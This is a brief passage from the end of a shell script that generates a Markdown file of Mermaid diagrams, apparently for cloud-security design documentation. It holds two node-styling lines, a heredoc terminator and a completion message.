    style OnPush fill:#1b5e20,color:#fff
    style RULE fill:#1565C0,color:#fff
```

EOF
echo "Done diagrams-cloud-security-lld.md"